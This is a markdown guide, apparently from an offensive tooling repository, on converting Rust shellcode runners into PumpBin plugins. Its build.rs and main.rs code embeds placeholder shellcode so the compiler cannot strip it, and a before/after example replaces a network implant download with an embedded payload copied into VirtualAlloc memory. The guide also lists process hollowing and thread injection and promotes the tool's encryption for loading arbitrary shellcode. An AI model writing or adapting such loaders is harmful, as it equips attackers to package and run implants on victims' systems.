# 🚀 Convert Any Rust Shellcode Project to PumpBin - Super Easy Guide

This guide will show you how to convert **ANY** existing Rust shellcode runner to work with PumpBin in just a few simple steps!

## 📋 What You Need Before Starting

- An existing Rust shellcode project (like the one you just added!)
- Basic understanding of where your shellcode gets loaded in the code
- 5-10 minutes of your time

## 🎯 The Simple 3-Step Process

### Step 1: Add the PumpBin Placeholder System

#### 1.1 Create or Update `build.rs`
Create a `build.rs` file in your project root with this exact content:

```rust
use std::{fs, iter};

fn main() {
    let mut shellcode = "$$SHELLCODE$$".as_bytes().to_vec();
    shellcode.extend(iter::repeat(b'0').take(1024*1024));
    fs::write("shellcode", shellcode.as_slice()).unwrap();
}
```

#### 1.2 Add Size Holder Function
Add this function somewhere in your `main.rs` (preferably near the top):

```rust
use std::hint::black_box;

// Force the size holder to be embedded in the binary by preventing optimization
#[inline(never)]
fn get_size_holder() -> &'static str {
    // Use a valid numeric string that can be parsed
    black_box("$$99999$$")
}

// Force the shellcode data to be preserved
#[inline(never)]
fn get_shellcode() -> &'static [u8] {
    black_box(include_bytes!("../shellcode"))
}
```

### Step 2: Replace Your Shellcode Loading Logic

#### 2.1 Find Your Shellcode Source
Look for where your code currently gets shellcode. This could be:
- ✅ Downloaded from network (like your custom example)
- ✅ Hardcoded bytes
- ✅ Read from a file
- ✅ Embedded resources

#### 2.2 Replace With PumpBin Logic
Replace your shellcode loading with this pattern:

```rust
fn main() {
    // Get shellcode from PumpBin placeholder
    let shellcode = get_shellcode();
    let size_holder_str = get_size_holder();
    let shellcode_len = usize::from_str_radix(size_holder_str, 10).unwrap();
    let shellcode = &shellcode[0..shellcode_len];

    // Your existing execution logic stays the same!
    // Just use the 'shellcode' variable instead of your old source
    
    // ... rest of your code unchanged ...
}
```

### Step 3: Test and Generate Plugin

#### 3.1 Test Your Conversion
```bash
cargo build --release
```

Your binary should compile successfully. The placeholder will be embedded but won't execute real shellcode yet.

#### 3.2 Use PumpBin Maker
1. Open PumpBin Maker
2. Fill in these values:
   - **Plugin Name**: `your_project_name`
   - **Prefix**: `$$SHELLCODE$$`
   - **Max Len**: `1048589`
   - **Type**: `Local`
   - **Size Holder**: `$$99999$$`
3. Select your compiled binary
4. Click Generate!

## 🔧 Real Example: Converting Your Custom Project

Let's convert your `custom` project as an example:

### Before (Network Download):
```rust
fn main() {
    let shellcode = download_implant(); // Downloads from network
    
    // Execution logic...
    let alloc = VirtualAlloc(/* ... */);
    std::ptr::copy_nonoverlapping(shellcode.as_ptr(), alloc as *mut u8, shellcode.len());
    // ... etc
}
```

### After (PumpBin Compatible):
```rust
fn main() {
    // Replace network download with PumpBin placeholder
    let shellcode = get_shellcode();
    let size_holder_str = get_size_holder();
    let shellcode_len = usize::from_str_radix(size_holder_str, 10).unwrap();
    let shellcode = &shellcode[0..shellcode_len];
    
    // Same execution logic - no changes needed!
    let alloc = VirtualAlloc(/* ... */);
    std::ptr::copy_nonoverlapping(shellcode.as_ptr(), alloc as *mut u8, shellcode.len());
    // ... etc
}
```

## 🎨 Advanced Patterns

### For Remote Type Plugins
If your original code downloaded shellcode, you can create a Remote type plugin:
1. Set **Type**: `Remote` in PumpBin Maker
2. Your original download logic can be moved to a separate WASM plugin
3. The binary template just needs the execution part

### For Different Execution Methods
PumpBin works with ANY execution method:
- ✅ CreateThread (Windows)
- ✅ Direct function calls
- ✅ Thread injection
- ✅ Process hollowing
- ✅ Syscalls
- ✅ Custom loaders

Just keep your execution logic and replace the shellcode source!

## 🚨 Common Gotchas

1. **Don't forget the build.rs file** - This creates the placeholder
2. **Use the exact strings** - `$$SHELLCODE$$` and `$$99999$$` must be exact
3. **Keep #[inline(never)]** - Prevents optimization from removing placeholders
4. **Use black_box()** - Forces the compiler to preserve the data

## ✅ Quick Checklist

- [ ] Added `build.rs` with placeholder generation
- [ ] Added `get_size_holder()` and `get_shellcode()` functions
- [ ] Replaced shellcode source with PumpBin logic
- [ ] Kept original execution logic unchanged
- [ ] Binary compiles successfully
- [ ] Generated plugin with PumpBin Maker

## 🎉 You're Done!

Your shellcode runner is now PumpBin compatible! Users can:
- Load any shellcode into your runner
- Benefit from PumpBin's encryption
- Use your custom execution techniques
- Have a portable, reusable plugin

## 🆘 Need Help?

If you get stuck:
1. Check the working examples in `/examples/create_thread/`
2. Use the automation tool (see `PUMPBIN_CONVERTER_TOOL.md`)
3. Compare your code with the pattern above

The key insight: **PumpBin just changes WHERE the shellcode comes from, not HOW it's executed!**
